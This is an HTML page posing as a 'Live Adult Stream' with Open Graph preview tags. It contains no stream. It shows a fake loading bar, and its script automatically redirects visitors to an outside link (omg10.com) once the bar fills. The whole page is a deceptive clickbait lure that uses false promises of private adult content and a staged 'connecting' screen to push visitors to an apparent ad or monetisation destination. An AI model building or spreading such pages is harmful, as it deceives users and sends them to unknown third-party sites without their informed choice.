<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Live Adult Stream – Connecting</title>

<!-- Open Graph -->
<meta property="og:title" content="Live Adult Stream">
<meta property="og:description" content="Tap to enter live private stream now">
<meta property="og:image" content="https://kodean.online/assets/img/post11.jpg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:url" content="https://kodean.online/live">
<meta property="og:type" content="website">
<meta name="description" content="Tap to enter live private stream now">

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{min-height:100vh;background:linear-gradient(180deg,#0a0015,#1a001f);color:#fff;display:flex;justify-content:center;align-items:center}
.app{width:100%;max-width:420px;min-height:100vh;display:flex;flex-direction:column}
.header{padding:14px 16px;display:flex;align-items:center;gap:12px;background:#1a001f;border-bottom:1px solid rgba(255,77,109,.2)}
.avatar{width:44px;height:44px;border-radius:50%;object-fit:cover;border:2px solid #ff2d55;box-shadow:0 0 12px #ff2d55}
.name{font-size:16px;font-weight:600}
.status{font-size:12px;color:#ff2d55;display:flex;align-items:center;gap:6px}
.status::before{content:"";width:7px;height:7px;background:#ff2d55;border-radius:50%;animation:blink 1.2s infinite}
@keyframes blink{0%,100%{opacity:.3}50%{opacity:1}}
.content{flex:1;padding:28px 20px;text-align:center}
.big-avatar{width:170px;height:170px;border-radius:50%;object-fit:cover;margin:48px auto 18px;box-shadow:0 0 25px #ff2d55,0 0 60px #ff6a00;animation:pulse 3s infinite}
@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.04)}}
.bio{font-size:15px;opacity:.85;margin-bottom:26px}
.loader{width:100%;height:12px;background:rgba(255,255,255,.12);border-radius:20px;overflow:hidden}
.loader span{display:block;height:100%;width:0%;background:linear-gradient(90deg,#ff2d55,#ff6a00,#ff2d55);background-size:200%;animation:flow 1.2s linear infinite;transition:width .25s}
@keyframes flow{from{background-position:0%}to{background-position:200%}}
.loading-text{margin-top:14px;font-size:12px;opacity:.7}
</style>

<script>
document.addEventListener("DOMContentLoaded",()=>{
  const bar = document.getElementById("bar");
  let w = 0;
  
  // Loader natural 2–3 detik
  const iv = setInterval(()=>{
    w += Math.floor(Math.random()*20)+20;
    if(w>100) w=100;
    bar.style.width = w + "%";

    if(w>=100){
      clearInterval(iv);
      setTimeout(()=>{
        window.location.href="https://omg10.com/4/10526666";
      }, 300);
    }
  }, 150);
});
</script>
</head>

<body>
<div class="app">
  <div class="header">
    <img src="https://kodean.online/assets/img/post11.jpg" class="avatar">
    <div>
      <div class="name">Live Adult Stream</div>
      <div class="status">LIVE</div>
    </div>
  </div>

  <div class="content">
    <img src="https://kodean.online/assets/img/post11.jpg" class="big-avatar">
    <div class="bio">Connecting to live stream…</div>
    <div class="loader"><span id="bar"></span></div>
    <div class="loading-text">Please wait while preparing your private room…</div>
  </div>
</div>
</body>
</html>
